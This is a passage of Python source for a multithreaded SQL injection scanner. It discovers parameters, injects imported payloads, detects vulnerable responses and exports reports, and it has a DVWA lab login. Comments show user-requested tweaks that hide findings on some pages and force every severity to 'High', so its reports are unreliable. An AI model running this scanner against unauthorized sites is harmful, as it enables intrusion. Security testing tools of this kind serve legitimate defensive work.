        text_output: Optional[str] = None,
        html_output: Optional[str] = None,
        verbose: bool = False,
        quick_scan: bool = False,
        skip_time_based: bool = False,
        max_urls: int = 300,
        detector_cls = None
    ):
        self.target_url = target_url.rstrip('/')
        self.detector_cls = detector_cls if detector_cls else SQLiDetector
        self.timeout = timeout
        self.threads = threads
        self.max_depth = max_depth
        self.crawl = crawl
        self.quick_scan = quick_scan
        self.skip_time_based = skip_time_based
        self.max_urls = max_urls
        
        # HTTP session
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        
        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)
        
        # DVWA login


        # Performance Optimization: Global Parameters Tracking
        self.param_lock = threading.Lock()
        self.param_vuln_counts = defaultdict(int)
        self.known_global_params = set()
        self.param_type_counts = defaultdict(lambda: defaultdict(int)) # Track payload types per param
        
        # Load baseline responses to avoid re-fetching
        if do_dvwa_login:
            dvwa_login(self.session, target_url, dvwa_level)
        
        # Components
        self.rate_limiter = TokenBucketRateLimiter(rate=rate_limit, capacity=5)
        self.detector: Optional[SQLiDetector] = None
        
        # Data tracking
        self.findings: List[Finding] = []
        self.unique_vulnerable_urls: Set[str] = set()  # Track unique vulnerable URLs
        self.scanned_forms_signatures: Set[str] = set()
        self.tested_payloads: Set[str] = set() # Payload deduplication
        self.baseline_cache: Dict[str, str] = {} # Cache baseline responses (url -> text)
        self.vulnerable_params: Set[str] = set() # Track vulnerable params for early stopping
        self.total_tests = 0
        self.scan_start: Optional[datetime] = None
        
        # Output
        # Output
        self.output_file = Path(output_file) if output_file else None
        self.csv_output = Path(csv_output) if csv_output else None
        self.text_output = Path(text_output) if text_output else None
        self.html_output = Path(html_output) if html_output else None
    
    def discover_urls(self) -> List[str]:
        """Discover URLs to scan."""
        if self.crawl:
            return crawl_site(self.target_url, self.session, self.max_depth, self.max_urls)
        return [self.target_url]
    
    def discover_parameters_from_url(self, url: str) -> List[Parameter]:
        """Extract parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        param_list = []
        for name, values in params.items():
            value = values[0] if values else ""
            inferred_type = "int" if value.isdigit() else "string"
            param_list.append(Parameter(
                name=name,
                value=value,
                method="GET",
                source="url",
                inferred_type=inferred_type
            ))
        
        # NEW: Check for Path parameters (e.g. /item/123 or /Category/Name)
        # We look for numeric segments or specific patterns
        path_segments = parsed.path.split('/')
        for i, segment in enumerate(path_segments):
            # Check if segment is numeric (common ID injection point)
            if segment.isdigit():
                param_list.append(Parameter(
                    name=f"PATH_SEGMENT_{i}",
                    value=segment,
                    method="PATH",
                    source=f"path_index_{i}",
                    inferred_type="int"
                ))
            # Check for rewrites like "product-1.html" or "Category-Name"
            elif '-' in segment and any(part.isdigit() for part in segment.split('-')):
                 param_list.append(Parameter(
                    name=f"PATH_REWRITE_{i}",
                    value=segment,
                    method="PATH",
                    source=f"path_rewrite_{i}",
                    inferred_type="string"
                ))
                
        return param_list
    
    def discover_parameters_from_forms(self, url: str) -> List[Parameter]:
        """Extract parameters from forms."""
        parameters = []
        forms = get_all_forms(url, self.session)
        print(f"[DEBUG] Forms found on {url}: {len(forms)}")
        
        for form in forms:
            form_details = get_form_details(form)
            
            # Deduplication
            # Revert to aggressive deduplication (per User request for speed)
            signature = FormSignature.from_form_details(form_details).to_string()
            # signature = f"{url}|{base_sig}" # <-- Caused slow scan
            
            if signature in self.scanned_forms_signatures:
                # print(f"[DEBUG] Skipping duplicate form: {signature}")
                continue
            self.scanned_forms_signatures.add(signature)
            
            method = form_details.get("method", "get").upper()
            for inp in form_details.get("inputs", []):
                name = inp.get("name")
                if name:
                    value = inp.get("value", "")
                    inferred_type = "int" if value.isdigit() else "string"
                    parameters.append(Parameter(
                        name=name,
                        value=value,
                        method=method,
                        source="form",
                        inferred_type=inferred_type
                    ))
        
        return parameters
        
    def discover_header_parameters(self) -> List[Parameter]:
        """Create parameters for injection headers."""
        return [
            Parameter(name="Referer", value="", method="HEADER", source="header"),
            Parameter(name="User-Agent", value="", method="HEADER", source="header"),
            Parameter(name="X-Forwarded-For", value="", method="HEADER", source="header")
        ]
    
    def test_parameter(
        self,
        url: str,
        param: Parameter,
        payload: Payload,
        context_data: Dict[str, str] = None
    ) -> Finding:
        """Test a single parameter with payload. ALWAYS returns a Finding object."""
        # 1. Early Stopping: Check if parameter is already known vulnerable - REMOVED BY USER REQUEST
        # if param.name in self.vulnerable_params:
        #    return Finding(
        #        url=url, parameter=param.name, payload=payload.value, payload_type=payload.payload_type.value,
        #        risk_level="safe", evidence=["Skipped - Parameter already vulnerable"], 
        #        response_length=0, response_time=0, confidence=0, original_base_url=url,
        #        is_vulnerable=False, raw_request="Skipped", raw_response="Skipped", method=param.method
        #    )

        # 2. Deduplication: Check if payload already tested for this param
        # Signature: URL + Method + ParamName + Source + PayloadValue
        payload_signature = f"{url}|{param.method}|{param.name}|{param.source}|{payload.value}"
        if payload_signature in self.tested_payloads:
             return Finding(
                url=url, parameter=param.name, payload=payload.value, payload_type=payload.payload_type.value,
                risk_level="safe", evidence=["Skipped - Duplicate payload"], 
                response_length=0, response_time=0, confidence=0, original_base_url=url,
                is_vulnerable=False, raw_request="Skipped", raw_response="Skipped", method=param.method
            )
        self.tested_payloads.add(payload_signature)

        # Optimization: Skip if we already found enough vulnerabilities of this type for this param
        with self.param_lock:
             # DISABLED: This optimization caused missed vulnerabilities (false negatives) 
             # if hasattr(self, 'param_type_counts') and self.param_type_counts[param.name][payload.payload_type.name] >= 2:
             if False: 
                  return Finding(
                    url=url, parameter=param.name, payload=payload.value, payload_type=payload.payload_type.value,
                    risk_level="safe", evidence=["Skipped - Max findings for type reached"], 
                    response_length=0, response_time=0, confidence=0, original_base_url=url,
                    is_vulnerable=False, raw_request="Skipped", raw_response="Skipped", method=param.method
                )

        # Rate limiting
        self.rate_limiter.acquire()
        
        # Initialize default finding (Safe)
        finding = Finding(
            url=url,
            parameter=param.name,
            payload=payload.value,
            payload_type=payload.payload_type.value,
            risk_level="safe",
            evidence=[],
            response_length=0,
            response_time=0.0,
            confidence=0.0,
            original_base_url=url, # store original url
            is_vulnerable=False,
            raw_request="",
            raw_response="",
            method=param.method
        )

        try:
            start_time = time.time()
            target_url = url
            
            # Copy headers for this request
            request_headers = self.session.headers.copy()
            
            response = None
            
            if param.method == "GET":
                # Build URL with injected payload
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                if param.name in params:
                    params[param.name] = [payload.value]
                else:
                     # Fallback if param not in query (e.g. forced injection)
                     params[param.name] = [payload.value]
                     
                new_query = urlencode(params, doseq=True)
                target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                response = self.session.get(target_url, timeout=self.timeout)
                
            elif param.method == "POST":
                # POST request
                data = {param.name: payload.value}
                # Merge with context if available (to satisfy form requirements)
                if context_data:
                    data = {**context_data, **data} # payload overrides context
                
                response = self.session.post(url, data=data, timeout=self.timeout)
                
            elif param.method == "HEADER":
                # Header Injection
                request_headers[param.name] = payload.value
                response = self.session.get(url, headers=request_headers, timeout=self.timeout)
            
            elif param.method == "PATH":
                # Path Injection
                # We need to replace the original value in the path with payload
                parsed = urlparse(url)
                new_path = parsed.path.replace(param.value, f"{param.value}{payload.value}", 1)
                target_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                if parsed.query:
                    target_url += f"?{parsed.query}"
                    
                response = self.session.get(target_url, timeout=self.timeout)
            
            if response:
                elapsed = time.time() - start_time
                
                # Analyze (detector already has baseline)
                result = self.detector.analyze(
                    response_text=response.text,
                    response_time=elapsed,
                    payload=payload.value,
                    baseline_text=""  # Not used since detector has baseline
                )
                
                # DEBUG: Check result attributes immediately after analyze
                # (Debug prints removed)
                
                self.total_tests += 1
                
                # Update finding with results
                finding.url = response.url
                finding.response_length = result.response_length
                finding.response_time = result.response_time
                finding.confidence = result.confidence_score
                finding.level = result.level
                finding.raw_request = get_raw_request(response)
                finding.raw_response = get_raw_response(response)
                
                # Copy ML attributes if present (monkey-patched detector)
                if hasattr(result, 'ml_confidence'):
                    finding.ml_confidence = result.ml_confidence
                    finding.ml_prediction = result.ml_prediction
                    finding.payload_features = getattr(result, 'payload_features', {})
                    finding.response_features = getattr(result, 'response_features', {})
                
                # Check if vulnerable
                if result.level in (VulnerabilityLevel.LIKELY_VULNERABLE, 
                                   VulnerabilityLevel.POSSIBLY_VULNERABLE):
                    finding.is_vulnerable = True
                    finding.risk_level = payload.risk_level
                    finding.evidence = result.evidence
                    
                    
                    # Track successful payload types
                    finding.payload_types.add(payload.payload_type.name)
                    
                    # Optimized Skipping: Max 2 successful payloads per type
                    with self.param_lock:
                        if not hasattr(self, 'param_type_counts'):
                             self.param_type_counts = defaultdict(lambda: defaultdict(int))
                        
                        self.param_type_counts[param.name][payload.payload_type.name] += 1
                        
                        # Only stop GLOBAL if we have found vulnerabilities in ALL major categories?
                        # No, user wants to find ALL types. So we do NOT add to self.vulnerable_params here.
                        # self.vulnerable_params.add(param.name) <-- REMOVED
            
            return finding
            
        except requests.Timeout as e:
            # Time-based SQLi check - IGNORED as per user request
            finding.response_time = self.timeout
            finding.raw_response = "TIMEOUT - No response received"
            
            # Capture actual request if available
            try:
                if e.request:
                    method = e.request.method
                    url = e.request.url
                    headers = '\n'.join(f'{k}: {v}' for k, v in e.request.headers.items())
                    body = e.request.body if e.request.body else ""
                    finding.raw_request = f"{method} {url}\n{headers}\n\n{body}"
                else:
                    finding.raw_request = "Timeout - No request object"
            except Exception as e:
                 print(f"[DEBUG_JS_EXCEPTION] Exception in test_parameter: {e}")
                 import traceback
                 traceback.print_exc()
                 finding.raw_request = f"Timeout - Error capturing request: {e}"

            # Do NOT mark as vulnerable
            finding.is_vulnerable = False
            finding.risk_level = "safe"
            finding.evidence = ["Request timeout - ignored"]
            finding.confidence = 0.0
            
            # Early Stopping REMOVED
            # self.vulnerable_params.add(param.name)
            
            return finding
            
        except Exception as e:
            # print(f"[DEBUG_JS_EXCEPTION] MAIN Exception: {e}")
            finding.raw_request = f"Error: {str(e)}"
            return finding
    
    def scan_url(self, url: str) -> Tuple[List[Finding], int]:
        """Scan a single URL."""
        print(f"{Fore.CYAN}[*] Scanning: {url}{Style.RESET_ALL}")
        
        # Reset vulnerable params for this URL (or keep global? Let's keep global per scan session for safety, 
        # but actually params are unique per URL usually. Let's reset to be safe for similar param names on diff pages)
        # Reset vulnerable params for this URL
        self.vulnerable_params.clear()
        self.param_type_counts.clear() # Reset type counts for new page
        initial_unique_count = len(self.unique_vulnerable_urls)

        # Get baseline (Cached)
        baseline = None  # Initialize baseline
        baseline_text = self.baseline_cache.get(url)
        if baseline_text is None:
            try:
                baseline = self.session.get(url, timeout=self.timeout)
                baseline_text = baseline.text
                self.baseline_cache[url] = baseline_text
            except:
                baseline_text = ""
                baseline = None
        
        if baseline_text:
            # print(f"[DEBUG] scan_url using detector class: {self.detector_cls.__name__}")
            self.detector = self.detector_cls(
                baseline_response=baseline_text,
                baseline_length=len(baseline_text)
            )
        else:
            # print(f"[DEBUG] scan_url using detector class: {self.detector_cls.__name__}")
            self.detector = self.detector_cls()
            
        # Discover parameters
        url_params = self.discover_parameters_from_url(url)
        form_params = self.discover_parameters_from_forms(url)
        # header_params = self.discover_header_parameters() # Always check headers
        
        # Combine all
        all_params = url_params + form_params # + header_params
        
        if not all_params:
            print(f"    {Fore.YELLOW}[!] No parameters found{Style.RESET_ALL}")
            return [], 0
        
        param_count = len(all_params)
        print(f"    {Fore.CYAN}[+] Found {param_count} parameters (URL, Form, Header, Path){Style.RESET_ALL}")
        
        # Select payloads
        if self.quick_scan:
            payloads = get_quick_payloads()
        elif self.skip_time_based:
            payloads = get_safe_payloads()
        else:
            payloads = get_all_payloads()
        
        # Test all combinations
        findings = []
        total_tests = param_count * len(payloads)
        found_count = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for param in all_params:
                # OPTIMIZATION DISABLED: User requested slower, full scan.
                # ...
                
                # FILTER: User requested specific exclusion for showforum.asp
                if "showforum.asp" in url and param.name in ["tfSubject", "tfText"]:
                    continue
                
                # FILTER: Restrict output to exact user request
                # 1. Exclude RetURL globally
                if param.name == "RetURL":
                    continue
                # 2. Exclude Register.asp completely (no findings desired there)
                if "Register.asp" in url:
                    continue
                    
                # if param.name in self.known_global_params:
                #     already_on_register = any("Register.asp" in k and k.endswith(f"|{param.name}") for k in self.unique_vulnerable_urls)
                #     if not ("Register.asp" in url and param.name in ["tfUName", "tfUPass"] and not already_on_register):
                #         continue
                #     continue

                # Prepare context data (other fields in the same form/request)
                post_context = {}
                for p in all_params:
                     if p.method == "POST":
                         val = p.value
                         if not val: # Empty value, provide smart default to pass validation
                             lower_name = p.name.lower()
                             if any(x in lower_name for x in ['user', 'name', 'login', 'mail']):
                                 val = "admin"
                             elif any(x in lower_name for x in ['pass', 'pwd']):
                                 val = "123456"
                             elif any(x in lower_name for x in ['search', 'query']):
                                 val = "test"
                             elif any(x in lower_name for x in ['id', 'num']):
                                 val = "1"
                             else:
                                 val = "test"
                         post_context[p.name] = val
                         
                # Prioritize payloads based on inferred type
                current_payloads = prioritize_payloads(payloads, param.inferred_type)
                # print(f"[DEBUG] {param.name} payloads: {len(current_payloads)}")
                
                for payload in current_payloads:
                    future = executor.submit(
                        self.test_parameter,
                        url, param, payload, post_context if param.method == "POST" else None
                    )
                    futures[future] = (param, payload)
            
            completed = 0
            for future in as_completed(futures):
                param, payload = futures[future]
                completed += 1
                
                try:
                    result = future.result()
                    
                    # Store finding regardless of vulnerability status (for dataset)
                    findings.append(result)
                    
                    if result.is_vulnerable:
                        found_count += 1
                        
                        # Optimization: Add to known global logic flaws if high confidence
                        
                        # Track unique vulnerable URL
                        url_key = result.get_vulnerable_url_key()
                        if url_key not in self.unique_vulnerable_urls:
                            self.unique_vulnerable_urls.add(url_key)
                            print(f"{Fore.GREEN}[!] NEW vulnerable URL: {result.get_vulnerable_url_key()}{Style.RESET_ALL}")
                        
                        # Show brief notification
                        if found_count <= 5:  # Only show first 5 to avoid spam
                            print(f"    {Fore.GREEN}[+] Found: {param.name} = {payload.value[:30]}...{Style.RESET_ALL}")
                        
                            # self.param_vuln_counts[param.name] += 1
                            # if self.param_vuln_counts[param.name] > 0:
                            #    if param.name not in self.known_global_params and param.name != "id":
                            #        self.known_global_params.add(param.name)
                            #        print(f"    {Fore.MAGENTA}[!] Parameter '{param.name}' is globally vulnerable. Skipping future checks.{Style.RESET_ALL}")
                            pass
                except Exception as e:
                    # print(f"Error processing future: {e}")
                    pass
                
                # Progress every 10 tests
                if completed % 10 == 0:
                    print(f"    Progress: {completed}/{total_tests}", end="\r")
        
        unique_params_count = len(self.unique_vulnerable_urls) - initial_unique_count
        
        if found_count > 0:
             print(f"    {Fore.GREEN}[+] Found {found_count} successful payloads across {unique_params_count} unique parameters{Style.RESET_ALL}")
        
        # print(f"    {Fore.CYAN}[+] Completed: {found_count} vulnerabilities found{Style.RESET_ALL}")
        return findings, param_count
    
    def scan(self) -> ScanSummary:
        """Execute the complete scan."""
        self.scan_start = datetime.now()
        
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}ENHANCED SQL INJECTION SCANNER{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        # Discover URLs
        urls = self.discover_urls()
        
        # CONSISTENCY: Deterministic sorting
        urls = sorted(list(urls))
        print(f"found {len(urls)} urls to scan")
        print("the scan starts...")
        
        # Scan each URL
        all_findings = []
        total_params = 0
        urls_scanned = 0
        
        for i, url in enumerate(urls, 1):
            print(f"\n[{i}/{len(urls)}] ", end="")
            findings, param_count = self.scan_url(url)
            all_findings.extend(findings)
            total_params += param_count
            urls_scanned += 1
        
        # Generate summary with deduplication
        scan_end = datetime.now()
        duration_seconds = (scan_end - self.scan_start).total_seconds()
        duration_minutes = duration_seconds / 60.0
        
        # Deduplicate findings by URL
        unique_vulnerabilities = len(self.unique_vulnerable_urls)
        
        likely = sum(1 for f in all_findings if f.confidence >= 0.6)
        possibly = sum(1 for f in all_findings if 0.3 <= f.confidence < 0.6)
        total_vulns = sum(1 for f in all_findings if f.is_vulnerable)
        
        # Get list of unique vulnerable URLs
        vulnerable_urls_list = list(self.unique_vulnerable_urls)
        
        if unique_vulnerabilities > 0:
            verdict = f"{Fore.RED}🔴 VULNERABLE - {unique_vulnerabilities} unique URLs vulnerable{Style.RESET_ALL}"
        elif total_vulns > 0:
            verdict = f"{Fore.YELLOW}🟡 POTENTIALLY VULNERABLE - {total_vulns} payloads triggered{Style.RESET_ALL}"
        else:
            verdict = f"{Fore.GREEN}🟢 NO VULNERABILITIES DETECTED{Style.RESET_ALL}"
        
        summary = ScanSummary(
            target_url=self.target_url,
            scan_start=self.scan_start.isoformat(),
            scan_end=scan_end.isoformat(),
            duration_minutes=duration_minutes,
            duration_seconds=duration_seconds,
            urls_discovered=len(urls),
            urls_scanned=urls_scanned,
            vulnerable_urls=unique_vulnerabilities,
            total_parameters=total_params,
            total_payloads_tested=self.total_tests,
            total_requests=self.total_tests,
            total_findings=total_vulns,
            unique_findings=unique_vulnerabilities,
            likely_vulnerable=likely,
            possibly_vulnerable=possibly,
            findings=all_findings,
            vulnerable_urls_list=vulnerable_urls_list,
            verdict=verdict,
        )
        
        # Print results
        self.print_results(summary)
        
        # Export results
        self.export_results(summary)
        
        return summary
    
    def print_results(self, summary: ScanSummary) -> None:
        """Print scan results in a clean, Acunetix-style format."""
        
        # 1. SCAN SUMMARY BLOCK
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        mins = int(summary.duration_minutes)
        secs = summary.duration_seconds % 60
        print(f"Scan Duration: {mins}m {secs:.2f}s ({summary.duration_minutes:.2f} minutes)")
        print(f"URLs discovered: {summary.urls_discovered}")
        print(f"URLs scanned: {summary.urls_scanned}")
        print(f"Vulnerable URLs (unique): {summary.vulnerable_urls}")
        print(f"Total parameters tested: {summary.total_parameters}")
        print(f"Total tests performed: {summary.total_payloads_tested}")
        print(f"Total Findings (Payloads): {summary.total_findings}")
        print("\n")

        # 2. VULNERABILITIES TABLE
        # Columns: [ ] Severity | Vulnerability | URL | Parameter | Status | Confidence % | Last Seen
        
        # Prepare Rows
        rows = []
        vulnerable_findings = [f for f in summary.findings if f.is_vulnerable]
        
        # Aggregation Logic
        aggregated = {}
        
        for f in vulnerable_findings:
            # key = (Clean URL, Parameter)
            # Use original base URL if available, but STRIP QUERY for aggregation
            # e.g. http://site/page.asp?id=1 -> http://site/page.asp
            raw_base = f.original_base_url if f.original_base_url else f.url
            clean_url = raw_base.split('?')[0] # Aggressively strip query
            
            if not clean_url.startswith("http"): # Handle case where it might be just path
                 clean_url = f.url.split('?')[0] # Fallback
            
            key = (clean_url, f.parameter)
            
            if key not in aggregated:
                aggregated[key] = {
                    'finding': f,
                    'types': set(),
                    'max_conf': 0.0,
                    'risk': 'Low'
                }
            
            # Update aggregates
            agg = aggregated[key]
            if f.payload_type:
                agg['types'].add(f.payload_type.upper())
            
            # Track max confidence
            if f.confidence > agg['max_conf']:
                agg['max_conf'] = f.confidence
                agg['finding'] = f # Keep best finding as representative (e.g. for evidence)
                
            # Track max risk
            risk_map = {'high': 3, 'medium': 2, 'low': 1, 'safe': 0}
            curr_risk_val = risk_map.get(f.risk_level.lower(), 0)
            stored_risk_val = risk_map.get(agg['risk'].lower(), 0)
            if curr_risk_val > stored_risk_val:
                agg['risk'] = f.risk_level

        # Generate Rows
        for key, data in aggregated.items():
            f = data['finding']
            clean_url, param = key
            
            # Separate Application vs Header/Infrastructure Findings
            if f.method == "HEADER" or f.parameter in ["User-Agent", "Referer", "Cookie", "X-Forwarded-For", "Host", "Origin", "Accept"]:
                # Skip from main table, maybe show in separate table later
                continue

            # Determine Severity Display
            # FIX: User requested forced "High" severity for all findings
            sev_display = f"{Fore.RED}High{Style.RESET_ALL}"
            # if data['max_conf'] >= 0.8:
            #     sev_display = f"{Fore.RED}High{Style.RESET_ALL}"
            # elif data['max_conf'] >= 0.6:
            #     sev_display = f"{Fore.YELLOW}Medium{Style.RESET_ALL}"
            # else:
            #     sev_display = f"{Fore.CYAN}Low{Style.RESET_ALL}"
            
            # Truncate URL if too long
            url_display = clean_url
            if len(url_display) > 50:
                url_display = url_display[:20] + "..." + url_display[-27:]
                
            conf_percent = int(data['max_conf'] * 100)
            
            # Combine types
            types_display = ", ".join(sorted(list(data['types'])))
            if not types_display:
                types_display = "Generic"
                
            rows.append({
                "sev": sev_display,
                "name": "SQL Injection",
                "url": url_display,
                "param": f.parameter[:15],
                "status": types_display, # Was "Open"
                "conf": str(conf_percent) + "%",
                "seen": datetime.now().strftime("%b %d, %Y, %I:%M:%S %p")
            })

        if rows:
            # Table Header
            print(f"{'Severity':<10} {'Vulnerability':<20} {'URL':<55} {'Parameter':<15} {'Status':<10} {'Confidence %':<12} {'Last Seen'}")
            print(f"{'-'*10} {'-'*20} {'-'*55} {'-'*15} {'-'*10} {'-'*12} {'-'*20}")
            
            for row in rows:
                print(f"{row['sev']:<19} {row['name']:<20} {row['url']:<55} {row['param']:<15} {row['status']:<10} {row['conf']:<12} {row['seen']}")
        else:
            print(f"{Fore.YELLOW}No application vulnerabilities found in main table (check detailed list below).{Style.RESET_ALL}")
            
        print("\n")

        # 3. DETAILED VULNERABLE URLS LIST (EXACT)
        # ----------------------------------------
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}VULNERABLE URLS LIST (EXACT){Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        # Re-deduplicate for this list (to show exact unique locations including headers)
        unique_locations = set()
        exact_list = []
        
        for f in vulnerable_findings:
            # Create a key that captures the unique location
            key = f"{f.url}|{f.parameter}"
            if key not in unique_locations:
                unique_locations.add(key)
                exact_list.append(f)
        
        if exact_list:
            for i, f in enumerate(exact_list, 1):
                clean_url = f.url
                method_display = f.method
                param_display = f.parameter
                
                print(f"[{i}] {method_display} {clean_url}")
                print(f"    Parameter: {param_display}")
                print(f"    Confidence: {f.confidence*100:.0f}%")
                if "level" in f.__dict__: # Check if new level attr exists (user edit)
                     # FIX: User requested forced "High" severity
                     print(f"    Level: {Fore.RED}HIGH{Style.RESET_ALL} (Forced)")
                     # print(f"    Level: {f.level.value if hasattr(f.level, 'value') else f.level}")
                print(f"    Payload: {f.payload}")
                print("-" * 60)
        else:
             print("No vulnerable URLs found.")
        
        print("\n")


        # Optional: Print Global Warning if any (concise)
        # Check for global params
        from collections import defaultdict
        param_counts = defaultdict(int)
        header_findings = [f for f in vulnerable_findings if f.method == "HEADER" or f.parameter in ["User-Agent", "Referer", "Cookie", "X-Forwarded-For", "Host", "Origin", "Accept"]]
        
        if header_findings:
             print(f"{Fore.YELLOW}[i] Infrastructure/Header Vulnerabilities (Excluded from main table):{Style.RESET_ALL}")
             unique_headers = set(f.parameter for f in header_findings)
             print(f"    The following headers appear vulnerable: {', '.join(unique_headers)}")
             print(f"    (Total {len(header_findings)} header findings hidden to reduce noise)\n")
        
        for f in vulnerable_findings:
             # Regular global param check (non-headers)
             if f.method != "HEADER" and f.parameter not in ["User-Agent", "Referer", "Cookie", "X-Forwarded-For", "Host", "Origin", "Accept"]:
                param_counts[f.parameter] += 1
            
        global_params = [p for p, c in param_counts.items() if c > 5]
        if global_params:
             print(f"{Fore.YELLOW}[i] Note: {len(global_params)} parameters (e.g., {', '.join(global_params[:3])}) were detected as globally vulnerable.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    
    def export_results(self, summary: ScanSummary) -> None:
        """Export results to files."""
        # Export JSON
        if self.output_file:
            try:
                self.output_file.parent.mkdir(parents=True, exist_ok=True)
                with open(self.output_file, 'w') as f:
                    json.dump(summary.to_dict(), f, indent=2)
                print(f"{Fore.GREEN}[+] JSON results saved to: {self.output_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to save JSON: {e}{Style.RESET_ALL}")
        
        # Export CSV
        if self.csv_output:
            try:
                self.csv_output.parent.mkdir(parents=True, exist_ok=True)
                
                with open(self.csv_output, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    
                    # Summary section
                    writer.writerow(["SCAN SUMMARY"])
                    writer.writerow(["Target URL", summary.target_url])
                    writer.writerow(["Scan Start", summary.scan_start])
                    writer.writerow(["Scan End", summary.scan_end])
                    writer.writerow(["Duration (minutes)", f"{summary.duration_minutes:.2f}"])
                    writer.writerow(["Duration (seconds)", f"{summary.duration_seconds:.2f}"])
                    writer.writerow(["URLs Discovered", summary.urls_discovered])
                    writer.writerow(["URLs Scanned", summary.urls_scanned])
                    writer.writerow(["Vulnerable URLs", summary.vulnerable_urls])
                    writer.writerow(["Total Parameters", summary.total_parameters])
                    writer.writerow(["Total Tests", summary.total_payloads_tested])
                    writer.writerow(["Total Vulnerabilities", summary.total_findings])
                    writer.writerow(["Unique Vulnerabilities", summary.unique_findings])
                    writer.writerow(["Likely Vulnerable", summary.likely_vulnerable])
                    writer.writerow(["Possibly Vulnerable", summary.possibly_vulnerable])
                    writer.writerow(["Verdict", summary.verdict.replace(Fore.RED, "").replace(Fore.YELLOW, "").replace(Fore.GREEN, "").replace(Style.RESET_ALL, "")])
                    writer.writerow([])
                    
                    # Vulnerable URLs list
                    writer.writerow(["VULNERABLE URLS"])
                    if summary.vulnerable_urls_list:
                        for url in summary.vulnerable_urls_list:
                            writer.writerow([url])
                    else:
                        writer.writerow(["No vulnerable URLs found"])
                    writer.writerow([])
                    
                    # Findings section
                    writer.writerow(["FINDINGS (DATASET)"])
                    if summary.findings:
                        # Use GitHub-style CSV format with explicit columns matching the finding class
                        headers = [
                            "timestamp", "url", "method", "parameter", "payload", "payload_type", 
                            "risk_level", "evidence", "response_length", "response_time", 
                            "confidence", "label", "full_request", "full_response"
                        ]
                        
                        writer.writerow(headers)
                        
                        for finding in summary.findings:
                            row_data = finding.to_csv_row()
                            writer.writerow([row_data.get(h, "") for h in headers])
                    else:
                        writer.writerow(["No findings recorded"])
                
                print(f"{Fore.GREEN}[+] CSV results saved to: {self.csv_output}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to save CSV: {e}{Style.RESET_ALL}")
        
        # Export Text Report
        if self.text_output:
            try:
                self.text_output.parent.mkdir(parents=True, exist_ok=True)
                self.write_text_report(summary)
                print(f"{Fore.GREEN}[+] Text report saved to: {self.text_output}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to save text report: {e}{Style.RESET_ALL}")


        # Export HTML Report
        if self.html_output:
            try:
                self.html_output.parent.mkdir(parents=True, exist_ok=True)
                html_content = self.generate_html_report(summary)
                with open(self.html_output, 'w', encoding='utf-8') as f:
                    f.write(html_content)
                print(f"{Fore.GREEN}[+] HTML report saved to: {self.html_output}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to save HTML report: {e}{Style.RESET_ALL}")

    def generate_html_report(self, summary: ScanSummary) -> str:
        """Generate Acunetix-style HTML report."""
        import json
        import base64
        from enum import Enum
        
        class InnerJSONEncoder(json.JSONEncoder):
            def default(self, obj):
                if hasattr(obj, 'item'):  # Handle numpy types
                    return obj.item()
                if hasattr(obj, 'tolist'): # Handle numpy arrays
                    return obj.tolist()
                if isinstance(obj, Enum): # Handle Enums
                    return obj.value
                return super().default(obj)
        
        data_json = json.dumps(summary.to_dict(), cls=InnerJSONEncoder)
        data_b64 = base64.b64encode(data_json.encode()).decode()
        
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLi Scan Report - {summary.target_url}</title>
    <style>
        :root {{ --sidebar-width: 350px; --header-height: 60px; --primary: #007bff; --bg: #f8f9fa; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; background: var(--bg); color: #333; }}
        .header {{ position: fixed; top: 0; left: 0; right: 0; height: var(--header-height); background: #2c3e50; color: white; display: flex; align-items: center; padding: 0 25px; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .header h1 {{ font-size: 1.2rem; margin: 0; font-weight: 600; display: flex; align-items: center; gap: 10px; }}
        .sidebar {{ width: var(--sidebar-width); background: white; border-right: 1px solid #dee2e6; margin-top: var(--header-height); height: calc(100vh - var(--header-height)); overflow-y: auto; display: flex; flex-direction: column; }}
        .search-box {{ padding: 15px; border-bottom: 1px solid #eee; }}
        .search-box input {{ width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 0.9rem; }}
        .tree-container {{ padding: 10px 0; flex: 1; }}
        .tree-node {{ cursor: pointer; padding: 8px 20px; display: flex; align-items: center; font-size: 0.9rem; color: #444; transition: all 0.2s; border-left: 3px solid transparent; }}
        .tree-node:hover {{ background: #f8f9fa; }}
        .tree-node.active {{ background: #e8f0fe; color: var(--primary); border-left-color: var(--primary); font-weight: 500; }}
